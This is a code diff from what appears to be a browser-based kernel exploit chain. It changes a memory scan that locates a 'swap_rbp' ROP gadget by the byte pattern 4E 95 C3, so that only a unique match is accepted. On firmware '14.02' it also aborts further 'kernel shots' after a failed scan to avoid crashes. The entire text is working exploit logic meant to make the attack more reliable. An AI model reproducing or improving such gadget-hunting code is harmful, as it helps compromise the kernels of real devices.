@@ -2199,21 +2199,32 @@ async function attempt(ctx, opts) {
 
     if (ran(scanR)) {
       const sb = rdbuf(scanBuf.at, SCAN_WIN);
-      let hit = -1;
+      let hit = -1, hits = 0;
       for (let i = 0; i < SCAN_WIN - 2; i++) {
-        if (sb[i] === 0x4E && sb[i + 1] === 0x95 && sb[i + 2] === 0xC3) { hit = i; break; }
+        if (sb[i] === 0x4E && sb[i + 1] === 0x95 && sb[i + 2] === 0xC3) {
+          hit = i;
+          hits++;
+        }
       }
-      if (hit >= 0) {
+      if (hits === 1) {
         const realRVA = K.swap_rbp - SCAN_PRE + hit;
         const delta = realRVA - K.swap_rbp;
         say("[1b] swap_rbp at scan+" + hit + " rva=0x" + realRVA.toString(16)
             + (delta !== 0 ? (" (shifted " + delta + ")") : " (same)"));
         K.swap_rbp = realRVA;
       } else {
-        say("[1b] swap_rbp 4e95c3 not in window -- using original, expect crash");
+        say("[1b] swap_rbp scan found " + hits + " matches");
+        if (ctx.firmware === "14.02") {
+          say("[1b] refusing another kernel shot; keep browser open and cold power off");
+          return false;
+        }
       }
     } else {
-      say("[1b] scan shot missed -- using original K.swap_rbp");
+      say("[1b] scan shot missed");
+      if (ctx.firmware === "14.02") {
+        say("[1b] refusing another kernel shot; keep browser open and cold power off");
+        return false;
+      }
     }
   }
 
